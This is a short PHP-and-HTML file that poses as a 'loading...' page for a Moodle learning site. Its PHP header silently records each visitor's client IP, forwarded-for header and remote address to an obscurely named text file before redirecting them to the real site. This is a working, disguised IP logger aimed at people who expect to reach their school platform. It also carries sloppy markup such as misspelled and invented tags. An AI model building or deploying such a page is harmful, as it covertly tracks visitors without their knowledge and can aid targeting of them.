<?php
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $file=fopen("0100101010100.txt","a");
    $data = $client.' '.$forward.' '.$remote."\n";
    fwrite($file, $data);
    fclose($file);
    header( 'Location: https://moodle.aschc.com/' ) ;
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <domain name="moodle.aschc.com" content="loading...">
    <meta type="icon" herf="//moodle.aschc.com/pluginfile.php/1/theme_mb2cg/favicon/1606133380/favicon.ico">
    <title>loading...</title>
</head>
<body>
    <script>
        cumdump = 'http://moodle.aschc.com/loading/';
        console.log("loading aschc" + cumdump);
    </script>
</body>
</html>